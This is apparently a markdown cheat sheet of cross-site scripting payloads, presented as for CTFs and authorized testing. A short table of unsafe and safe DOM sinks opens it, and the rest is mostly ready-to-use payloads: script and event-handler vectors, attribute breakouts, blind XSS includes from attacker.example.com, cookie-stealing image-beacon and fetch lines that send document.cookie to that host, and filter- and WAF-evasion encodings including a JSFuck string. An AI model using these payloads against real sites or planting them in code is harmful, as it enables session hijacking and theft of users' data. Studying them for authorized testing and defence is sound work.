# Cross-Site Scripting (XSS) Reference Guide

A comprehensive quick-reference guide covering Cross-Site Scripting (XSS) execution contexts, event handler vectors, modern framework injections, blind data exfiltration, and filter/WAF evasion for security assessments and lab environments.

---

## 1. Context & Injection Types

### Vulnerability Types
Understand the underlying data flow mechanism to select the correct payload structure.
```
| Type                          | Data Flow & Execution Context                                                              | Example Scenario |

| **Reflected XSS**             | Injected data is reflected off a web server in an immediate HTTP response.                 | Search fields, error parameters (`?q=<script>...`) |
| **Stored (Persistent) XSS**   | Payload is stored in the database/disk and rendered to users viewing the resource.         | Comments, user profiles, ticket logs |
| **DOM-Based XSS**             | Source data is read and written to an unsafe execution sink directly in client-side JS.    | `location.hash` written to `element.innerHTML` |
| **Blind XSS**                 | Stored payload executes in an administrative backend or out-of-band context.               | User-Agent logs, internal feedback/support consoles |
```
---

### Unsafe Sinks vs Safe Sinks (DOM)
Identify client-side sinks during source code review or whitebox testing.
```
| Sink Category              | Unsafe JavaScript Execution Sinks                                                          | Safe Hardened Alternatives |

| **HTML Injection**         | `element.innerHTML`<br>`element.outerHTML`<br>`document.write()`<br>`document.writeln()`   | `element.textContent`<br>`element.innerText` |
| **Code Execution**         | `eval()`<br>`Function()`<br>`setTimeout("string", ms)`<br>`setInterval("string", ms)`      | `setTimeout(callbackFn, ms)`<br>`JSON.parse()` |
| **Location / Navigation**  | `location.href`<br>`location.replace()`<br>`location.assign()`<br>`window.open()`          | Whitelist-validated URL paths<br>Strict scheme check (`https://`) |
| **DOM Attributes**         | `element.setAttribute("onclick", ...)`<br>`element.src` (with `javascript:`)               | `element.addEventListener('click', fn)`<br>`element.setAttribute("data-*", val)` |
```
---

## 2. Basic Payloads & Element Vectors

### Basic Proof of Concept (PoC)
Standard tags used to confirm script execution in unescaped contexts.

-- Standard Script Tags
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script src="[https://attacker.example.com/xss.js](https://attacker.example.com/xss.js)"></script>
```

-- Media Elements
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=1 onerror=innerHTML=location.hash>
<img src=sa onerror=eval(document.location.hash.substr(1))>
<video src=x onerror=alert(1)></video>
<video><source onerror="javascript:alert(1)"></video>
<audio src=x onerror=alert(1)></audio>
```

-- SVG & Vector Elements
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg xmlns:xlink="[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/></a></svg>
<svg><script xlink:href="data:,window.open('[https://attacker.example.com](https://attacker.example.com)')"></script></svg>
```

-- Body, Frames & Object Tags
```html
<body onload=alert(1)>
<body/onhashchange=alert(1)><a href=#>click</a>
<iframe src="javascript:alert(1)"></iframe>
<iframe onload=alert(1)></iframe>
<iframe srcdoc="&lt;body onload=alert(1)&gt;"></iframe>
<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="></iframe>
<object data="javascript:alert(1)"></object>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<embed src="javascript:alert(1)">
```

-- Interactive & Form Elements
```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<input type="image" formaction="javascript:alert(1)">
<select autofocus onfocus=alert(1)></select>
<select onchange=alert(1)><option>1</option><option>2</option></select>
<textarea autofocus onfocus=alert(1)></textarea>
<form action="javascript:alert(1)"><button>Submit</button></form>
<form><button formaction="javascript:alert(1)">Submit</button></form>
<details ontoggle=alert(1)>Toggle</details>
<marquee onstart=alert(1)></marquee>
<div onmouseover=alert(1)>Hover</div>
<a href="javascript:alert(1)">Click</a>
<a onmouseover=alert(1)>Hover</a>
```

-- CSS Animation Events
```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

## 3. Attribute & Context Breaking

Payloads designed to terminate existing HTML attributes, tags, or script contexts.

-- Breaking Out of HTML Attributes
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='
" onmouseover="alert(1)" bad="
" autofocus onfocus=alert(1)//
```

-- Breaking Out of Existing <script> / <style> / <textarea> Blocks
```html
</script><script>alert(1)</script>
</style><script>alert(1)</script>
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
';alert(1);//
"-alert(1)-"
');alert(1)//
${alert(1)}
```

## 4. Blind XSS & Data Exfiltration

Techniques for exfiltrating sensitive session data, DOM tokens, or cookies from headless/remote browsers

-- Script Tag Include
```html
<script src="//[attacker.example.com/hook.js](https://attacker.example.com/hook.js)"></script>
"><script src="//[attacker.example.com/hook.js](https://attacker.example.com/hook.js)"></script>
```

-- Dynamic DOM Script Injection
```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'//[attacker.example.com/hook.js](https://attacker.example.com/hook.js)\';document.body.appendChild(a)')
```

-- Image Beacon Cookie Stealing
```
<script>
var i = new Image();
i.src = "[https://attacker.example.com/log](https://attacker.example.com/log)?" + encodeURIComponent(document.cookie);
</script>
```

-- Fetch / XHR Exfiltration
```html
<svg onload="fetch('[https://attacker.example.com/?c='+encodeURIComponent(document.cookie](https://attacker.example.com/?c='+encodeURIComponent(document.cookie)))">
```

## 5. Filter & WAF Evasion

A curated reference for bypassing Web Application Firewalls (WAFs), input sanitization routines, and character blacklists.

Character & Payload Encoding

When direct JavaScript syntax or HTML tags are filtered, leverage entity encoding or Unicode variations:

-- URL Encoding
```
Original: alert(1)
Encoded:  %3Cscript%3Ealert(1)%3C%2Fscript%3E
```

-- Double URL Encoding
```
Original: alert(1)
Encoded:  %253Cscript%253Ealert(1)%253C%252Fscript%253E
```

-- HTML Decimal Entity Encoding
```
Original: javascript:alert('XSS')
Encoded:  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
```

-- HTML Hexadecimal Entity Encoding
```
Original: javascript:alert('XSS')
Encoded:  &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#58;&#53;&#53;&#27;&#29;
```

-- Unicode Escape Sequences
```
Original: <script>alert(1)</script>
Encoded:  \u003cscript\u003ealert(1)\u003c/script\u003e
```

-- Hexadecimal Escape Sequences
```
Original: <script>alert(1)</script>
Encoded:  \x3cscript\x3ealert(1)\x3c/script\x3e
```

Whitespace & Delimiter Bypasses
Techniques for environments where standard whitespace (%20 or spaces), quotes, or parentheses are stripped or blocked.

-- No Whitespace Allowed (Forward Slash Delimiters)
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```
-- No Parentheses Allowed (ES6 Template Literals / Backticks)
```html
<script>alert`1`</script>
<img src=x onerror=alert`1`>
```
-- No Quotes Allowed (Dynamic Character Code Resolution)
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```
-- Null Byte Filter Truncation
```html
<script>%00alert(1)</script>
```
-- Control Character Whitespace Insertion (Tab, LF, CR)
```html
<!-- Tab (%09) -->
<a href="jav&#x09;ascript:alert(1)">Click</a>

<!-- Line Feed (%0A) -->
<a href="jav&#x0A;ascript:alert(1)">Click</a>

<!-- Carriage Return (%0D) -->
<a href="jav&#x0D;ascript:alert(1)">Click</a>
```

## 6. Keyword Obfuscation & Function Evaluation

When keywords (alert, eval, document, window) are blocked by signature filters:

-- Dynamic Evaluation via String Concatenation & Object Bracket Notation
```html
window['al'+'ert'](1);
this['al'+'ert'](1);
top['al'+'ert'](1);
globalThis['al'+'ert'](1);
Function('ale'+'rt(1)')();
(0, eval)('alert(1)');
```
-- Alternative Execution Wrappers
```html
setTimeout('alert(1)', 0);
setInterval('alert(1)', 1000);
[1].find(alert);
```
-- JSFuck / Non-Alphanumeric Execution
```html
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]])()
```

<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
